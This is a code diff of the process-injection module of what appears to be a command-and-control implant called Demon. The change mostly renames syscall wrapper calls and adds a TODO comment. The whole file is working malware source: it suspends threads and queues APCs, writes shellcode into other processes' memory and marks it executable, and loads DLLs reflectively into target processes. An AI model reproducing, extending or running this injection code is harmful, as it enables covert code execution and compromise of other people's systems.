@@ -1,15 +1,17 @@
 #include <Demon.h>
 #include <ntstatus.h>
 
-#include <Core/WinUtils.h>
+#include <Core/Win32.h>
 #include <Core/Syscalls.h>
 #include <Core/Package.h>
 #include <Core/MiniStd.h>
-
 #include <Inject/Inject.h>
 #include <Inject/InjectUtil.h>
-
 #include <Common/Macros.h>
+
+/*
+ * TODO: rewrite this entire code
+ * */
 
 BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJECTION_CTX ctx )
 {
@@ -56,22 +58,22 @@ BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes
                                 ProcClientID.UniqueProcess = ( HANDLE ) ( ULONG_PTR ) ctx->ProcessID;
                                 ProcClientID.UniqueThread  = ( HANDLE ) ( ULONG_PTR ) threadId;
 
-                                Instance.Syscall.NtOpenThread( &ctx->hThread, MAXIMUM_ALLOWED, &ObjectAttributes, &ProcClientID );
+                                Instance.Win32.NtOpenThread( &ctx->hThread, MAXIMUM_ALLOWED, &ObjectAttributes, &ProcClientID );
 
                                 break;
                             }
                         }
                     }
 
-                    Instance.Win32.NtClose( hSnapshot );
+                    SysNtClose( hSnapshot );
 
-                    if ( NT_SUCCESS( ( NtStatus = Instance.Syscall.NtSuspendThread( ctx->hThread, NULL ) ) ) )
+                    if ( NT_SUCCESS( ( NtStatus = Instance.Win32.NtSuspendThread( ctx->hThread, NULL ) ) ) )
                     {
                         PUTS("[+] NtSuspendThread: Successful")
 
                         if ( ShellcodeInjectionSysApc( ctx->hProcess, lpShellcodeBytes, ShellcodeSize, ctx ) )
                         {
-                            NtStatus = Instance.Syscall.NtResumeThread( ctx->hThread, NULL );
+                            NtStatus = Instance.Win32.NtResumeThread( ctx->hThread, NULL );
                             if ( NT_SUCCESS( NtStatus ) )
                             {
                                 PUTS("[+] NtResumeThread: Successful")
@@ -122,7 +124,7 @@ BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes
                     ctx->SuspendAwake = FALSE;
                     if ( ShellcodeInjectionSysApc( ProcessInfo.hProcess, lpShellcodeBytes, ShellcodeSize, ctx ) )
                     {
-                        NtStatus = Instance.Syscall.NtAlertResumeThread( ProcessInfo.hThread, NULL );
+                        NtStatus = Instance.Win32.NtAlertResumeThread( ProcessInfo.hThread, NULL );
                         if ( ! NT_SUCCESS( NtStatus ) )
                         {
                             PUTS( "[-] NtResumeThread: Failed" );
@@ -138,8 +140,8 @@ BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes
                         Success = FALSE;
                     }
 
-                    Instance.Win32.NtClose( ProcessInfo.hThread );
-                    Instance.Win32.NtClose( ProcessInfo.hProcess );
+                    SysNtClose( ProcessInfo.hThread );
+                    SysNtClose( ProcessInfo.hProcess );
 
                     return Success;
                 }
@@ -159,8 +161,8 @@ BOOL ShellcodeInjectDispatch( BOOL Inject, SHORT Method, LPVOID lpShellcodeBytes
                     ctx->hProcess = ProcessInfo.hProcess;
                     Success = ShellcodeInjectionSys( lpShellcodeBytes, ShellcodeSize, ctx );
 
-                    Instance.Win32.NtClose( ProcessInfo.hThread );
-                    Instance.Win32.NtClose( ProcessInfo.hProcess );
+                    SysNtClose( ProcessInfo.hThread );
+                    SysNtClose( ProcessInfo.hProcess );
 
                     return Success;
                 }
@@ -191,7 +193,7 @@ BOOL ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJE
         ShellcodeArg = MemoryAlloc( DX_MEM_DEFAULT, ctx->hProcess, ctx->ParameterSize, PAGE_READWRITE );
         if ( ShellcodeArg )
         {
-            NtStatus = Instance.Syscall.NtWriteVirtualMemory( ctx->hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &BytesWritten );
+            NtStatus = Instance.Win32.NtWriteVirtualMemory( ctx->hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &BytesWritten );
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "[-] NtWriteVirtualMemory: Failed" )
@@ -200,7 +202,7 @@ BOOL ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJE
         }
     }
 
-    // NtStatus = Instance.Syscall.NtAllocateVirtualMemory( hProcess, &lpVirtualMemory, 0, &ShellcodeSize, MEM_RESERVE | MEM_COMMIT,  );
+    // NtStatus = Instance.Win32.NtAllocateVirtualMemory( hProcess, &lpVirtualMemory, 0, &ShellcodeSize, MEM_RESERVE | MEM_COMMIT,  );
     lpVirtualMemory = MemoryAlloc( DX_MEM_DEFAULT, ctx->hProcess, ShellcodeSize, PAGE_READWRITE );
     if ( ! lpVirtualMemory )
     {
@@ -210,7 +212,7 @@ BOOL ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJE
     else
         PUTS("[+] NtAllocateVirtualMemory: Successful");
 
-    NtStatus = Instance.Syscall.NtWriteVirtualMemory( ctx->hProcess, lpVirtualMemory, lpShellcodeBytes, ShellcodeSize, &ShellcodeSize );
+    NtStatus = Instance.Win32.NtWriteVirtualMemory( ctx->hProcess, lpVirtualMemory, lpShellcodeBytes, ShellcodeSize, &ShellcodeSize );
     if ( ! NT_SUCCESS( NtStatus ) )
     {
         PUTS("[-] NtWriteVirtualMemory: failed")
@@ -219,7 +221,7 @@ BOOL ShellcodeInjectionSys( LPVOID lpShellcodeBytes, SIZE_T ShellcodeSize, PINJE
     else
         PUTS("[+] NtWriteVirtualMemory: Successful")
 
-    // NtStatus = Instance.Syscall.NtProtectVirtualMemory( hProcess, &lpVirtualMemory, &ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection );
+    // NtStatus = Instance.Win32.NtProtectVirtualMemory( hProcess, &lpVirtualMemory, &ShellcodeSize, PAGE_EXECUTE_READ, &OldProtection );
     if ( ! MemoryProtect( DX_MEM_SYSCALL, ctx->hProcess, lpVirtualMemory, ShellcodeSize, PAGE_EXECUTE_READ ) )
     {
         PUTS("[-] NtProtectVirtualMemory: failed")
@@ -262,7 +264,7 @@ BOOL ShellcodeInjectionSysApc( HANDLE hProcess, LPVOID lpShellcodeBytes, SIZE_T 
         ShellcodeArg = MemoryAlloc( DX_MEM_DEFAULT, hProcess, ctx->ParameterSize, PAGE_READWRITE );
         if ( ShellcodeArg )
         {
-            NtStatus = Instance.Syscall.NtWriteVirtualMemory( hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &BytesWritten );
+            NtStatus = Instance.Win32.NtWriteVirtualMemory( hProcess, ShellcodeArg, ctx->Parameter, ctx->ParameterSize, &BytesWritten );
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "[-] NtWriteVirtualMemory: Failed" )
@@ -276,17 +278,17 @@ BOOL ShellcodeInjectionSysApc( HANDLE hProcess, LPVOID lpShellcodeBytes, SIZE_T 
     {
         PUTS("[+] MemoryAlloc: Successful")
 
-        NtStatus = Instance.Syscall.NtWriteVirtualMemory( hProcess, lpVirtualMemory, lpShellcodeBytes, ShellcodeSize, &ShellcodeSize );
+        NtStatus = Instance.Win32.NtWriteVirtualMemory( hProcess, lpVirtualMemory, lpShellcodeBytes, ShellcodeSize, &ShellcodeSize );
         if ( NT_SUCCESS( NtStatus ) )
         {
             PUTS("[+] Moved memory: Successful")
 
-            // NtStatus = Instance.Syscall.NtProtectVirtualMemory( hProcess, &lpVirtualMemory, &ShellcodeSize, PAGE_EXECUTE_READ, &BytesWritten );
+            // NtStatus = Instance.Win32.NtProtectVirtualMemory( hProcess, &lpVirtualMemory, &ShellcodeSize, PAGE_EXECUTE_READ, &BytesWritten );
             if ( MemoryProtect( DX_MEM_SYSCALL, hProcess, lpVirtualMemory, ShellcodeSize, PAGE_EXECUTE_READ ) )
             {
                 PUTS("[+] MemoryProtect: Successful")
 
-                // NtStatus = Instance.Syscall.NtQueueApcThread( ctx->hThread, lpVirtualMemory, ShellcodeArg, NULL, NULL );
+                // NtStatus = Instance.Win32.NtQueueApcThread( ctx->hThread, lpVirtualMemory, ShellcodeArg, NULL, NULL );
                 ctx->Parameter = ShellcodeArg;
                 if ( ThreadCreate( DX_THREAD_SYSAPC, hProcess, lpVirtualMemory, ctx ) )
                 {
@@ -390,7 +392,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
         if ( MemParamsBuffer )
         {
             PRINTF( "MemoryAlloc: Success allocated memory for parameters: ptr:[%p]\n", MemParamsBuffer )
-            NtStatus = Instance.Syscall.NtWriteVirtualMemory( hTargetProcess, MemParamsBuffer, Parameter, ParamSize, &BytesWritten );
+            NtStatus = Instance.Win32.NtWriteVirtualMemory( hTargetProcess, MemParamsBuffer, Parameter, ParamSize, &BytesWritten );
             if ( ! NT_SUCCESS( NtStatus ) )
             {
                 PUTS( "NtWriteVirtualMemory: Failed to write memory for parameters" )
@@ -415,7 +417,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
     if ( MemLibraryBuffer )
     {
         PUTS( "[+] NtAllocateVirtualMemory: success" );
-        if ( NT_SUCCESS( NtStatus = Instance.Syscall.NtWriteVirtualMemory( hTargetProcess, MemLibraryBuffer, FullDll, FullDllSize, &BytesWritten ) ) )
+        if ( NT_SUCCESS( NtStatus = Instance.Win32.NtWriteVirtualMemory( hTargetProcess, MemLibraryBuffer, FullDll, FullDllSize, &BytesWritten ) ) )
         {
             // TODO: check to get the .text section and size of it
             PRINTF( "[+] NtWriteVirtualMemory: success: ptr[%p]\n", MemLibraryBuffer );
@@ -425,7 +427,7 @@ DWORD DllInjectReflective( HANDLE hTargetProcess, LPVOID DllLdr, DWORD DllLdrSiz
             MemRegionSize = 16384;
             BytesWritten    = 0;
 
-            // NtStatus = Instance.Syscall.NtProtectVirtualMemory( hTargetProcess, &MemRegion, &MemRegionSize, PAGE_EXECUTE_READ, &OldProtect );
+            // NtStatus = Instance.Win32.NtProtectVirtualMemory( hTargetProcess, &MemRegion, &MemRegionSize, PAGE_EXECUTE_READ, &OldProtect );
             if ( MemoryProtect( DX_MEM_SYSCALL, hTargetProcess, MemRegion, MemRegionSize, PAGE_EXECUTE_READ ) )
             {
                 ctx->Parameter = MemParamsBuffer;
@@ -500,8 +502,8 @@ DWORD DllSpawnReflective( LPVOID DllLdr, DWORD DllLdrSize, LPVOID DllBuffer, DWO
             if ( ! Instance.Win32.TerminateProcess( ProcessInfo.hProcess, 0 ) )
                 PRINTF( "(Not major) Failed to Terminate Process: %d\n", NtGetLastError()  )
 
-            Instance.Win32.NtClose( ProcessInfo.hProcess );
-            Instance.Win32.NtClose( ProcessInfo.hThread );
+            SysNtClose( ProcessInfo.hProcess );
+            SysNtClose( ProcessInfo.hThread );
         }
     }
 
